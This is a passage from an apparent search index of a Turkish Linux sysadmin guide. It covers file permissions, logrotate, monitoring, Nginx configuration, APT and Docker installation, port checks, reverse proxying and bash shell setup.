~/.config/app/secrets.conf\nchown $USER:$USER ~/.config/app/secrets.conf\n</code></pre>"},{"location":"how-to/file-permissions/#troubleshooting","title":"\ud83d\udd0d Troubleshooting","text":""},{"location":"how-to/file-permissions/#izin-hatas-permission-denied","title":"\u0130zin Hatas\u0131: \"Permission denied\"","text":"<pre><code># Dosya izinlerini kontrol et\nls -l dosya.txt\n\n# Sahipli\u011fi kontrol et\nstat dosya.txt\n\n# \u00dcst dizin izinlerini kontrol et\nls -ld $(dirname dosya.txt)\n\n# \u00c7\u00f6z\u00fcm: \u0130zin ver\nchmod +r dosya.txt  # Okuma\nchmod +w dosya.txt  # Yazma\nchmod +x dosya.txt  # \u00c7al\u0131\u015ft\u0131rma\n</code></pre>"},{"location":"how-to/file-permissions/#script-calsmyor","title":"Script \u00c7al\u0131\u015fm\u0131yor","text":"<pre><code># \u00c7al\u0131\u015ft\u0131rma izni var m\u0131?\nls -l script.sh\n\n# \u00c7\u00f6z\u00fcm:\nchmod +x script.sh\n\n# Shebang var m\u0131?\nhead -1 script.sh\n# #!/bin/bash olmal\u0131\n</code></pre>"},{"location":"how-to/file-permissions/#web-dosyalar-403-forbidden","title":"Web Dosyalar\u0131 403 Forbidden","text":"<pre><code># Nginx/Apache kullan\u0131c\u0131s\u0131 eri\u015febiliyor mu?\nsudo -u www-data ls /var/www/html\n\n# \u00c7\u00f6z\u00fcm:\nsudo chown -R www-data:www-data /var/www/html\nsudo find /var/www/html -type d -exec chmod 755 {} \\;\nsudo find /var/www/html -type f -exec chmod 644 {} \\;\n</code></pre>"},{"location":"how-to/file-permissions/#hzl-referans","title":"\ud83d\udcda H\u0131zl\u0131 Referans","text":""},{"location":"how-to/file-permissions/#chmod-cheat-sheet","title":"chmod Cheat Sheet","text":"<pre><code>chmod 777  # rwxrwxrwx - ASLA KULLANMA!\nchmod 755  # rwxr-xr-x - Dizinler, scriptler\nchmod 700  # rwx------ - \u00d6zel dizinler\nchmod 644  # rw-r--r-- - Normal dosyalar\nchmod 600  # rw------- - Hassas dosyalar\nchmod 555  # r-xr-xr-x - Read-only \u00e7al\u0131\u015ft\u0131r\u0131labilir\nchmod 444  # r--r--r-- - Read-only\n</code></pre>"},{"location":"how-to/file-permissions/#chown-cheat-sheet","title":"chown Cheat Sheet","text":"<pre><code>chown user file              # Sadece sahip\nchown user:group file        # Sahip ve grup\nchown :group file            # Sadece grup\nchown -R user:group dir      # Recursive\nchown --reference=ref file   # Ba\u015fka dosyadan kopyala\n</code></pre>"},{"location":"how-to/file-permissions/#referanslar","title":"\ud83d\udcd6 Referanslar","text":"<ul> <li>chmod man page</li> <li>chown man page</li> <li>umask man page</li> <li>ACL Guide</li> </ul>"},{"location":"how-to/logrotate/","title":"Logrotate Kurulumu","text":"<p>Bu rehber, log dosyalarinin rotasyonunu kapsar.</p>"},{"location":"how-to/logrotate/#ornek-konfigurasyon","title":"Ornek konfigurasyon","text":"<p><code>/etc/logrotate.d/app</code>: <pre><code>/var/log/app/*.log {\n  daily\n  rotate 7\n  compress\n  missingok\n  notifempty\n  copytruncate\n}\n</code></pre></p>"},{"location":"how-to/logrotate/#dogrulama","title":"Dogrulama","text":"<pre><code>logrotate -d /etc/logrotate.d/app\n</code></pre>"},{"location":"how-to/logrotate/#dogrulama_1","title":"Dogrulama","text":"<ul> <li>Rotasyon kurali dogru calisiyor mu?</li> <li>Disk kullanimi kontrol altinda mi?</li> </ul>"},{"location":"how-to/monitoring-stack/","title":"Monitoring Stack","text":"<p>Bu rehber, temel izleme yigininin kurulumu icin plan sunar.</p>"},{"location":"how-to/monitoring-stack/#kapsam","title":"Kapsam","text":"<ul> <li>Metrikler (Prometheus veya benzeri)</li> <li>Dashboard (Grafana veya benzeri)</li> <li>Alerting (Alertmanager veya benzeri)</li> </ul>"},{"location":"how-to/monitoring-stack/#plan","title":"Plan","text":"<ol> <li>Metrik kaynaklarini belirle (node, uygulama, DB).</li> <li>Dashboard ve alarm kurallarini standartlastir.</li> <li>Oncall ve bildirim kanallarini bagla.</li> </ol>"},{"location":"how-to/monitoring-stack/#dogrulama","title":"Dogrulama","text":"<ul> <li>Temel dashboardlar hazir mi?</li> <li>Alarm kanallari calisiyor mu?</li> </ul>"},{"location":"how-to/monitoring/","title":"Monitoring Kurulumu","text":"<p>Bu rehber, temel servis izleme ve alarmlari kapsar.</p>"},{"location":"how-to/monitoring/#gereksinimler","title":"Gereksinimler","text":"<ul> <li>Izlenecek servis listesi</li> <li>Uptime/alert servisi (ornek: Uptime Kuma, PagerDuty, Opsgenie)</li> </ul>"},{"location":"how-to/monitoring/#kurulum-adimlari","title":"Kurulum adimlari","text":"<ol> <li>Kritik endpointleri listele.</li> <li>Healthcheck URL veya port kontrolu ekle.</li> <li>Alarm esikleri belirle (latency, hata orani).</li> </ol>"},{"location":"how-to/monitoring/#temel-metrikler-ve-loglar","title":"Temel metrikler ve loglar","text":"<ul> <li>Sistem loglari: <code>journalctl</code></li> <li>Web sunucusu loglari: <code>/var/log/nginx/</code></li> <li>Disk: <code>df -h</code>, bellek: <code>free -m</code></li> <li>Servis durumu: <code>systemctl status &lt;servis&gt;</code></li> </ul>"},{"location":"how-to/monitoring/#dogrulama","title":"Dogrulama","text":"<ul> <li>Alarm tetikleniyor mu?</li> <li>Sahiplik ve oncall dogru mu?</li> </ul>"},{"location":"how-to/nginx/","title":"Nginx Kurulumu ve Optimizasyonu","text":"<p>Basit bir kurulumun \u00f6tesine ge\u00e7erek, Nginx'i y\u00fcksek trafik ve g\u00fcvenlik i\u00e7in haz\u0131rlayaca\u011f\u0131z.</p>"},{"location":"how-to/nginx/#1-kurulum-eksiksiz","title":"1. Kurulum (Eksiksiz)","text":"<p>Varsay\u0131lan repo bazen eski olabilir, ancak kararl\u0131l\u0131k (stability) i\u00e7in LTS s\u00fcr\u00fcmlerde Ubuntu reposunu tercih ediyoruz.</p> <pre><code>sudo apt update\nsudo apt install -y nginx\nsudo systemctl enable --now nginx\n</code></pre>"},{"location":"how-to/nginx/#2-production-altn-konfigurasyon","title":"2. Production \"Alt\u0131n\" Konfig\u00fcrasyon","text":"<p>Varsay\u0131lan <code>nginx.conf</code> dosyas\u0131 genellikle \u00e7ok tutucudur. A\u015fa\u011f\u0131daki ayarlar performans\u0131 art\u0131r\u0131r ve sunucu kimli\u011fini gizler.</p> <p><code>/etc/nginx/nginx.conf</code> dosyas\u0131n\u0131 yedekleyin ve a\u015fa\u011f\u0131daki bloklar\u0131 ekleyin/d\u00fczenleyin:</p> /etc/nginx/nginx.conf<pre><code>user www-data;\nworker_processes auto; # CPU \u00e7ekirdek say\u0131s\u0131 kadar worker\npid /run/nginx.pid;\ninclude /etc/nginx/modules-enabled/*.conf;\n\nevents {\n    worker_connections 2048; # Varsay\u0131lan 768'den y\u00fckseltin\n    multi_accept on;\n}\n\nhttp {\n    ##\n    # Temel Ayarlar\n    ##\n    sendfile on;\n    tcp_nopush on;\n    tcp_nodelay on;\n    keepalive_timeout 65;\n    types_hash_max_size 2048;\n    server_tokens off; # Nginx versiyonunu gizle (G\u00fcvenlik)\n\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n\n    ##\n    # G\u00fcvenlik Headerlar\u0131 (Global)\n    ##\n    add_header X-Frame-Options \"SAMEORIGIN\" always;\n    add_header X-XSS-Protection \"1; mode=block\" always;\n    add_header X-Content-Type-Options \"nosniff\" always;\n    add_header Referrer-Policy \"no-referrer-when-downgrade\" always;\n    add_header Content-Security-Policy \"default-src 'self' http: https: data: blob: 'unsafe-inline'\" always;\n\n    ##\n    # Gzip S\u0131k\u0131\u015ft\u0131rma (Performans)\n    ##\n    gzip on;\n    gzip_vary on;\n    gzip_proxied any;\n    gzip_comp_level 6; # 1-9 aras\u0131, 6 ideal denge\n    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\n\n    ##\n    # Loglama\n    ##\n    access_log /var/log/nginx/access.log;\n    error_log /var/log/nginx/error.log;\n\n    include /etc/nginx/conf.d/*.conf;\n    include /etc/nginx/sites-enabled/*;\n}\n</code></pre>"},{"location":"how-to/nginx/#3-konfigurasyon-dogrulama","title":"3. Konfig\u00fcrasyon Do\u011frulama","text":"<p>Her de\u011fi\u015fiklikten sonra mutlaka s\u00f6zdizimi (syntax) kontrol\u00fc yap\u0131n:</p> <pre><code>sudo nginx -t\n# Output: syntax is ok, test is successful\n</code></pre> <p>Hatas\u0131z ise yeniden ba\u015flat\u0131n:</p> <pre><code>sudo systemctl reload nginx\n</code></pre>"},{"location":"how-to/nginx/#dogrulama-sorular","title":"Do\u011frulama Sorular\u0131","text":"<ul> <li>[ ] <code>server_tokens off;</code> ayar\u0131 yap\u0131ld\u0131 m\u0131? (Curl -I ile versiyon g\u00f6r\u00fcnmemeli)</li> <li>[ ] Gzip aktif mi?</li> <li>[ ] Worker process say\u0131s\u0131 auto mu?</li> </ul>"},{"location":"how-to/package-management/","title":"Paket Y\u00f6netimi ve Docker","text":"<p>Sunucu kararl\u0131l\u0131\u011f\u0131 i\u00e7in en \u00f6nemli kural: \"Paketleri kayna\u011f\u0131ndan ve kontroll\u00fc y\u00fckle.\"</p>"},{"location":"how-to/package-management/#1-apt-advanced-package-tool","title":"1. APT (Advanced Package Tool)","text":"<p>Ubuntu/Debian sistemlerde varsay\u0131lan paket y\u00f6neticisidir.</p>"},{"location":"how-to/package-management/#temel-komutlar-dogru-kullanm","title":"Temel Komutlar (Do\u011fru Kullan\u0131m)","text":"<pre><code># Sadece paket listesini g\u00fcncelle (Y\u00fckleme yapmaz)\napt update\n\n# G\u00fcvenli g\u00fcncelleme (Mevcut konfig\u00fcrasyonu bozmadan)\napt upgrade -y\n\n# Temizlik (Gereksiz ba\u011f\u0131ml\u0131l\u0131klar\u0131 siler - \u00d6NEML\u0130)\napt autoremove --purge\napt clean\n</code></pre> <p>[!TIP] &gt; <code>apt autoremove</code> G\u00fcvenli mi? Evet! \"Hac\u0131 bu ne?\" demeyin. :) Bu komut sadece \"\u00d6ks\u00fcz Kalm\u0131\u015f (Orphaned)\" paketleri, yani art\u0131k hi\u00e7bir uygulaman\u0131n ihtiya\u00e7 duymad\u0131\u011f\u0131 k\u00fct\u00fcphaneleri siler. \u00d6zellikle eski Linux Kernellerini silip <code>/boot</code> alan\u0131n\u0131 bo\u015faltmak i\u00e7in kritiktir.</p> <p>Dikkat: Silmeden \u00f6nce listeye g\u00f6z at\u0131n. E\u011fer silinmesini istemedi\u011finiz bir paket varsa <code>apt-mark manual paket_adi</code> komutuyla onu korumaya alabilirsiniz.</p>"},{"location":"how-to/package-management/#versiyon-sabitleme-holding","title":"Versiyon Sabitleme (Holding)","text":"<p>Bir paketin (\u00f6rn. Nginx veya MySQL) kazara g\u00fcncellenmesini istemiyorsan\u0131z:</p> <pre><code># G\u00fcncellemeyi engelle\napt-mark hold nginx\n\n# Engeli kald\u0131r\napt-mark unhold nginx\n</code></pre>"},{"location":"how-to/package-management/#2-docker-kurulumu-resmi-yontem","title":"2. Docker Kurulumu (Resmi Y\u00f6ntem)","text":"<p>\u26a0\ufe0f UYARI: Asla <code>apt install docker.io</code> komutunu kullanmay\u0131n! Bu komut Ubuntu deposundaki (genellikle \u00e7ok eski) s\u00fcr\u00fcm\u00fc kurar. Her zaman resmi Docker reposunu kullan\u0131n.</p>"},{"location":"how-to/package-management/#kurulum-scripti","title":"Kurulum Scripti","text":"<pre><code># 1. Eski s\u00fcr\u00fcmleri temizle\nfor pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; done\n\n# 2. Keyring ve Repo ayarla\nsudo apt-get update\nsudo apt-get install ca-certificates curl gnupg\nsudo install -m 0755 -d /etc/apt/keyrings\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\nsudo chmod a+r /etc/apt/keyrings/docker.gpg\n\n# 3. Repoyu listeye ekle\necho \\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\\n  $(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\") stable\" | \\\n  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\n\n# 4. Kur\nsudo apt-get update\nsudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n</code></pre>"},{"location":"how-to/package-management/#3-ppa-ve-harici-repolar","title":"3. PPA ve Harici Repolar","text":"<p>Prensip: \"M\u00fcmk\u00fcn olan en az harici repo.\"</p> <p>Google'da buldu\u011funuz rastgele PPA'leri eklemeyin. Sadece \u00fcreticinin (Vendor) resmi dok\u00fcman\u0131ndaki repolar\u0131 kullan\u0131n (\u00d6rn: Postgres.org, Redis.io, Nginx.org).</p>"},{"location":"how-to/package-management/#4-snap-ve-flatpak","title":"4. Snap ve Flatpak","text":"<p>Sunucularda (Server Environment) kullan\u0131lmas\u0131 \u00f6nerilmez.</p> <ul> <li>Neden?: Snap arka planda sanal loop cihazlar\u0131 (mount points) olu\u015fturur. <code>df -h</code> \u00e7\u0131kt\u0131s\u0131n\u0131 kirletir ve bazen disk y\u00f6netimi sorunlar\u0131na yol a\u00e7ar.</li> <li>\u0130stisna: Sadece ba\u015fka alternatifi yoksa (\u00d6rn: Baz\u0131 durumlarda Certbot) kullan\u0131labilir ama <code>apt</code> veya <code>docker</code> her zaman \u00f6nceliklidir.</li> </ul>"},{"location":"how-to/package-management/#5-otomatik-servis-yenileme-needrestart","title":"5. Otomatik Servis Yenileme (Needrestart) \ud83d\udd04","text":"<p>Linux'ta bir paket g\u00fcncellendi\u011finde (\u00f6rne\u011fin <code>openssl</code>), bu k\u00fct\u00fcphaneyi kullanan servisler (Nginx, SSH vb.) otomatik olarak YEN\u0130LENMEZ. Eski (a\u00e7\u0131kl\u0131) versiyonu RAM'de kullanmaya devam ederler.</p> <p>Bunu \u00e7\u00f6zmek i\u00e7in <code>needrestart</code> arac\u0131 kullan\u0131l\u0131r.</p>"},{"location":"how-to/package-management/#kurulum","title":"Kurulum","text":"<pre><code>sudo apt update\nsudo apt install needrestart -y\n</code></pre>"},{"location":"how-to/package-management/#konfigurasyon-otomasyon-icin","title":"Konfig\u00fcrasyon (Otomasyon \u0130\u00e7in)","text":"<p>Varsay\u0131lan olarak <code>needrestart</code> interaktif \u00e7al\u0131\u015f\u0131r ve size soru sorar. Bu durum <code>apt upgrade</code> scriptlerinin tak\u0131lmas\u0131na neden olabilir.</p> <p>Otomatik yeniden ba\u015flatma modunu a\u00e7mak i\u00e7in:</p> <p>Dosya: <code>/etc/needrestart/needrestart.conf</code></p> <pre><code># 'i' (interactive) yerine 'a' (auto) yap\u0131n\n$nrconf{restart} = 'a';\n</code></pre> <p>Veya tek komutla ayar:</p> <pre><code>sudo sed -i \"s/#\\$nrconf{restart} = 'i';/\\$nrconf{restart} = 'a';/\" /etc/needrestart/needrestart.conf\n</code></pre> <p>Art\u0131k g\u00fcncellemelerden sonra servisler otomatik olarak yeniden ba\u015flayacak ve g\u00fcvenlik yamalar\u0131 an\u0131nda aktif olacakt\u0131r.</p>"},{"location":"how-to/port-checks/","title":"Ag ve Port Kontrolleri","text":"<p>Bu rehber, acik portlar ve baglantilari kontrol etmeyi kapsar.</p>"},{"location":"how-to/port-checks/#beklenen-portlar-ornek","title":"Beklenen portlar (ornek)","text":"<ul> <li>22/tcp: SSH</li> <li>80/tcp: HTTP</li> <li>443/tcp: HTTPS</li> </ul>"},{"location":"how-to/port-checks/#acik-portlari-goster","title":"Acik portlari goster","text":"<pre><code>ss -tulpen\n</code></pre>"},{"location":"how-to/port-checks/#belirli-portu-dinleyen-sureci-bul","title":"Belirli portu dinleyen sureci bul","text":"<pre><code>ss -tulpen | rg \":443\"\n</code></pre>"},{"location":"how-to/port-checks/#dosya-descriptor-ile-kontrol","title":"Dosya descriptor ile kontrol","text":"<pre><code>lsof -i -P -n | rg LISTEN\n</code></pre>"},{"location":"how-to/port-checks/#firewall-durumu","title":"Firewall durumu","text":"<pre><code>ufw status verbose\n</code></pre>"},{"location":"how-to/port-checks/#dogrulama","title":"Dogrulama","text":"<ul> <li>Gerekli portlar acik mi?</li> <li>Beklenmeyen servisler dinliyor mu?</li> </ul>"},{"location":"how-to/reverse-proxy/","title":"Reverse Proxy","text":"<p>Bu rehber, Nginx uzerinden uygulama proxy'lemeyi kapsar.</p>"},{"location":"how-to/reverse-proxy/#gereksinimler","title":"Gereksinimler","text":"<ul> <li>Nginx kurulu ve calisir durumda</li> <li>Uygulama portu lokalda dinliyor</li> <li>Nginx kurulumu icin: Nginx Kurulumu</li> </ul>"},{"location":"how-to/reverse-proxy/#ornek-konfigurasyon","title":"Ornek konfigurasyon","text":"<p><code>/etc/nginx/sites-available/app.conf</code>: <pre><code>server {\n  listen 80;\n  server_name example.com;\n\n  location / {\n    proxy_pass http://127.0.0.1:3000;\n    proxy_set_header Host $host;\n    proxy_set_header X-Real-IP $remote_addr;\n  }\n}\n</code></pre></p> <pre><code>ln -s /etc/nginx/sites-available/app.conf /etc/nginx/sites-enabled/\nnginx -t\nsystemctl reload nginx\n</code></pre>"},{"location":"how-to/reverse-proxy/#dogrulama","title":"Dogrulama","text":"<ul> <li><code>nginx -t</code> basarili mi?</li> <li>Uygulama endpointi yanit veriyor mu?</li> </ul>"},{"location":"how-to/shell-config/","title":"Shell Konfig\u00fcrasyonu (.bashrc, Alias, PATH) \ud83d\udc1a","text":""},{"location":"how-to/shell-config/#linuxta-terminal-actgnzda-hangi-ayarlarn-yuklendigini-aliaslarn-nasl-tanmlandgn-ve-path-degiskeninin-nasl-yonetildigini-anlatan-rehber","title":"Linux'ta terminal a\u00e7t\u0131\u011f\u0131n\u0131zda hangi ayarlar\u0131n y\u00fcklendi\u011fini, alias'lar\u0131n nas\u0131l tan\u0131mland\u0131\u011f\u0131n\u0131 ve PATH de\u011fi\u015fkeninin nas\u0131l y\u00f6netildi\u011fini anlatan rehber.","text":""},{"location":"how-to/shell-config/#konfigurasyon-dosyalari","title":"\ud83d\udcc1 Shell Konfig\u00fcrasyon Dosyalar\u0131","text":""},{"location":"how-to/shell-config/#dosyalar-ve-yuklenme-sras","title":"Dosyalar ve Y\u00fcklenme S\u0131ras\u0131","text":"<p>Linux'ta birden fazla konfig\u00fcrasyon dosyas\u0131 vard\u0131r ve hangi dosyan\u0131n ne zaman y\u00fcklendi\u011fi \u00f6nemlidir.</p>"},{"location":"how-to/shell-config/#login-shell-ssh-ile-baglannca","title":"Login Shell (SSH ile ba\u011flan\u0131nca)","text":"<pre><code>1. /etc/profile           # Sistem geneli (t\u00fcm kullan\u0131c\u0131lar)\n2. ~/.bash_profile        # Kullan\u0131c\u0131ya \u00f6zel (varsa)\n   VEYA\n   ~/.bash_login          # .bash_profile yoksa\n   VEYA\n   ~/.profile             # \u0130kisi de yoksa\n3. ~/.bashrc              # Genelde .bash_profile i\u00e7inden \u00e7a\u011fr\u0131l\u0131r\n</code></pre>"},{"location":"how-to/shell-config/#non-login-shell-terminal-acnca","title":"Non-Login Shell (Terminal a\u00e7\u0131nca)","text":"<pre><code>1. ~/.bashrc              # Sadece bu y\u00fcklenir\n</code></pre>"},{"location":"how-to/shell-config/#hangi-dosyay-kullanmalym","title":"Hangi Dosyay\u0131 Kullanmal\u0131y\u0131m?","text":"Dosya Ne Zaman Kullan\u0131l\u0131r \u00d6rnek ~/.bashrc Alias, fonksiyonlar, prompt <code>alias ll='ls -la'</code> ~/.bash_profile PATH, ortam de\u011fi\u015fkenleri <code>export PATH=$PATH:/opt/bin</code> ~/.profile Ubuntu'da .bash_profile yoksa Ayn\u0131 i\u015flev /etc/profile Sistem geneli ayarlar (root) T\u00fcm kullan\u0131c\u0131lar i\u00e7in <p>[!TIP] &gt; En Pratik Y\u00f6ntem: Her \u015feyi <code>~/.bashrc</code>'ye yaz\u0131n. \u00c7\u00fcnk\u00fc genelde <code>.bash_profile</code> i\u00e7inde zaten <code>.bashrc</code> \u00e7a\u011fr\u0131l\u0131r:</p> <pre><code># ~/.bash_profile i\u00e7eri\u011fi (varsay\u0131lan)\nif [ -f ~/.bashrc ]; then\n    . ~/.bashrc\nfi\n</code></pre>"},{"location":"how-to/shell-config/#alias-tanimlama","title":"\ud83d\udd17 Alias Tan\u0131mlama","text":"<p>Alias, uzun komutlar\u0131 k\u0131saltmak i\u00e7in kullan\u0131l\u0131r. Kal\u0131c\u0131 olmas\u0131 i\u00e7in <code>~/.bashrc</code> dosyas\u0131na eklenir.</p>"},{"location":"how-to/shell-config/#basit-aliaslar","title":"Basit Alias'lar","text":"<pre><code># ~/.bashrc dosyas\u0131n\u0131 a\u00e7\nnano ~/.bashrc\n\n# Dosyan\u0131n sonuna ekle:\nalias ll='ls -lah'\nalias la='ls -A'\nalias l='ls -CF'\n\n# G\u00fcvenlik i\u00e7in (yanl\u0131\u015fl\u0131kla silmeyi \u00f6nle)\nalias rm='rm -i'\nalias cp='cp -i'\nalias mv='mv -i'\n\n# H\u0131zl\u0131 navigasyon\nalias ..='cd ..'\nalias ...='cd ../..'\nalias ....='cd ../../..'\n\n# Docker k\u0131sayollar\u0131\nalias dps='docker ps'\nalias dpsa='docker ps -a'\nalias dimg='docker images'\nalias dlog='docker logs -f'\n\n# Git k\u0131sayollar\u0131\nalias gs='git status'\nalias ga='git add'\nalias gc='git commit'\nalias gp='git push'\nalias gl='git log --oneline'\n\n# Sistem bilgisi\nalias meminfo='free -m -l -t'\nalias diskinfo='df -h'\nalias cpuinfo='lscpu'\n</code></pre>"},{"location":"how-to/shell-config/#parametreli-aliaslar-fonksiyon-olarak","title":"Parametreli Alias'lar (Fonksiyon Olarak)","text":"<p>Alias parametre alamaz, bunun i\u00e7in fonksiyon kullanmal\u0131s\u0131n\u0131z:</p> <pre><code># ~/.bashrc\n\n# Docker container'a gir\ndexec() {\n    docker exec -it \"$1\" /bin/bash\n}\n\n# Git commit + push\ngcp() {\n    git add .\n    git commit -m \"$1\"\n    git push\n}\n\n# Dosya yedekle\nbackup() {\n    cp \"$1\" \"$1.backup.$(date +%Y%m%d_%H%M%S)\"\n}\n\n# Port dinleyen process'i bul\nport() {\n    sudo lsof -i :\"$1\"\n}\n\n# Kullan\u0131m:\n# dexec mycontainer\n# gcp \"Fix bug\"\n# backup config.yml\n# port 8080\n</code></pre>"},{"location":"how-to/shell-config/#aliaslar-aktif-etme","title":"Alias'lar\u0131 Aktif Etme","text":"<pre><code># De\u011fi\u015fiklikleri y\u00fckle (yeni terminal a\u00e7madan)\nsource ~/.bashrc\n\n# Veya k\u0131sa yolu:\n. ~/.bashrc\n\n# T\u00fcm alias'lar\u0131 listele\nalias\n\n# Belirli bir alias'\u0131 g\u00f6ster\nalias ll\n</code></pre>"},{"location":"how-to/shell-config/#path-yonetimi","title":"\ud83d\udee4\ufe0f PATH Y\u00f6netimi","text":"<p><code>PATH</code>, sistemin komutlar\u0131 nerede arayaca\u011f\u0131n\u0131 belirten ortam de\u011fi\u015fkenidir.</p>"},{"location":"how-to/shell-config/#mevcut-pathi-goruntuleme","title":"Mevcut PATH'i G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code># PATH'i g\u00f6ster\necho $PATH\n\n# Daha okunabilir (her dizin ayr\u0131 sat\u0131rda)\necho $PATH | tr ':' '\\n'\n</code></pre>"},{"location":"how-to/shell-config/#pathe-dizin-ekleme","title":"PATH'e Dizin Ekleme","text":"<p>Ge\u00e7ici (sadece o oturum i\u00e7in):</p> <pre><code>export PATH=$PATH:/opt/myapp/bin\n</code></pre> <p>Kal\u0131c\u0131 (her oturumda):</p> <pre><code># ~/.bashrc dosyas\u0131n\u0131 a\u00e7\nnano ~/.bashrc\n\n# Dosyan\u0131n sonuna ekle:\nexport PATH=$PATH:/opt/myapp/bin\nexport PATH=$PATH:$HOME/.local/bin\nexport PATH=$PATH:/usr/local/go/bin\n\n# Y\u00fckle\nsource ~/.bashrc\n</code></pre>"},{"location":"how-to/shell-config/#path-sras-onemlidir","title":"PATH S\u0131ras\u0131 \u00d6nemlidir!","text":"<pre><code># Yeni dizini SONA ekle (mevcut komutlar \u00f6ncelikli)\nexport PATH=$PATH:/new/dir\n\n# Yeni dizini BA\u015eA ekle (yeni komutlar \u00f6ncelikli)\nexport PATH=/new/dir:$PATH\n</code></pre> <p>\u00d6rnek: E\u011fer <code>/usr/bin/python</code> ve <code>/opt/python/bin/python</code> varsa:</p> <pre><code># /opt/python \u00f6ncelikli olsun\nexport PATH=/opt/python/bin:$PATH\n</code></pre>"},{"location":"how-to/shell-config/#ortam-degiskenleri","title":"\ud83c\udf0d Ortam De\u011fi\u015fkenleri","text":""},{"location":"how-to/shell-config/#yaygn-ortam-degiskenleri","title":"Yayg\u0131n Ortam De\u011fi\u015fkenleri","text":"<pre><code># ~/.bashrc\n\n# Varsay\u0131lan edit\u00f6r\nexport EDITOR=nano\nexport VISUAL=nano\n\n# Dil ayarlar\u0131\nexport LANG=en_US.UTF-8\nexport LC_ALL=en_US.UTF-8\n\n# History ayarlar\u0131\nexport HISTSIZE=10000\nexport HISTFILESIZE=20000\nexport HISTCONTROL=ignoredups:erasedups\n\n# Node.js\nexport NODE_ENV=production\n\n# Go\nexport GOPATH=$HOME/go\nexport PATH=$PATH:$GOPATH/bin\n\n# Python\nexport PYTHONPATH=$HOME/python-libs\n\n# Java\nexport JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64\nexport PATH=$PATH:$JAVA_HOME/bin\n</code></pre>"},{"location":"how-to/shell-config/#ortam-degiskenini-goruntuleme","title":"Ortam De\u011fi\u015fkenini G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code># Belirli bir de\u011fi\u015fken\necho $HOME\necho $USER\necho $PATH\n\n# T\u00fcm ortam de\u011fi\u015fkenleri\nenv\n\n# Veya\nprintenv\n\n# Belirli bir de\u011fi\u015fkeni ara\nenv | grep JAVA\n</code></pre>"},{"location":"how-to/shell-config/#prompt-ozellestirme","title":"\ud83c\udfa8 Prompt \u00d6zelle\u015ftirme","text":"<p><code>PS1</code> de\u011fi\u015fkeni, terminal prompt'unuzu (komut sat\u0131r\u0131 ba\u015f\u0131ndaki yaz\u0131) \u00f6zelle\u015ftirir.</p>"},{"location":"how-to/shell-config/#varsaylan-prompt","title":"Varsay\u0131lan Prompt","text":"<pre><code># Ubuntu varsay\u0131lan\nuser@hostname:~$\n\n# CentOS varsay\u0131lan\n[user@hostname ~]$\n</code></pre>"},{"location":"how-to/shell-config/#ozel-prompt-ornekleri","title":"\u00d6zel Prompt \u00d6rnekleri","text":"<pre><code># ~/.bashrc\n\n# Basit (sadece dizin)\nexport PS1=\"\\w $ \"\n\n# Renkli (kullan\u0131c\u0131@host:dizin)\nexport PS1=\"\\[\\e[32m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[0m\\]\\$ \"\n\n# Git branch g\u00f6ster (geli\u015fmi\u015f)\nparse_git_branch() {\n    git branch 2&gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/ (\\1)/'\n}\nexport PS1=\"\\[\\e[32m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[33m\\]\\$(parse_git_branch)\\[\\e[0m\\]\\$ \"\n\n# Zaman ekle\nexport PS1=\"[\\t] \\u@\\h:\\w\\$ \"\n</code></pre> <p>Renk Kodlar\u0131:</p> <pre><code>\\[\\e[30m\\]  # Siyah\n\\[\\e[31m\\]  # K\u0131rm\u0131z\u0131\n\\[\\e[32m\\]  # Ye\u015fil\n\\[\\e[33m\\]  # Sar\u0131\n\\[\\e[34m\\]  # Mavi\n\\[\\e[35m\\]  # Mor\n\\[\\e[36m\\]  # Cyan\n\\[\\e[37m\\]  # Beyaz\n\\[\\e[0m\\]   # Reset (renksiz)\n</code></pre> <p>\u00d6zel Karakterler:</p> <pre><code>\\u  # Kullan\u0131c\u0131 ad\u0131\n\\h  # Hostname\n\\w  # Tam dizin yolu\n\\W  # Sadece dizin ad\u0131\n\\t  # Saat (24 saat)\n\\d  # Tarih\n\\$  # $ (normal kullan\u0131c\u0131) veya # (root)\n</code></pre>"},{"location":"how-to/shell-config/#ubuntu-centos-farklari","title":"\ud83d\udd04 Ubuntu vs CentOS Farklar\u0131","text":""},{"location":"how-to/shell-config/#dosya-konumlar","title":"Dosya Konumlar\u0131","text":"\u00d6zellik Ubuntu CentOS/RHEL Kullan\u0131c\u0131 bashrc <code>~/.bashrc</code> <code>~/.bashrc</code> Kullan\u0131c\u0131 profile <code>~/.profile</code> <code>~/.bash_profile</code> Sistem bashrc <code>/etc/bash.bashrc</code> <code>/etc/bashrc</code> Sistem profile <code>/etc/profile</code> <code>/etc/profile</code>"},{"location":"how-to/shell-config/#varsaylan-aliaslar","title":"Varsay\u0131lan Alias'lar","text":"<p>Ubuntu (<code>~/.bashrc</code>):</p> <pre><code>alias ls='ls --color=auto'\nalias ll='ls -alF'\nalias la='ls -A'\nalias l='ls -CF'\n</code></pre> <p>CentOS (<code>~/.bashrc</code>):</p> <pre><code>alias rm='rm -i'\nalias cp='cp -i'\nalias mv='mv -i'\nalias ll='ls -l --color=auto'\n</code></pre>"},{"location":"how-to/shell-config/#yukleme-davrans","title":"Y\u00fckleme Davran\u0131\u015f\u0131","text":"<p>Ubuntu:</p> <pre><code># ~/.profile i\u00e7inde:\nif [ -n \"$BASH_VERSION\" ]; then\n    if [ -f \"$HOME/.bashrc\" ]; then\n        . \"$HOME/.bashrc\"\n    fi\nfi\n</code></pre> <p>CentOS:</p> <pre><code># ~/.bash_profile i\u00e7inde:\nif [ -f ~/.bashrc ]; then\n    . 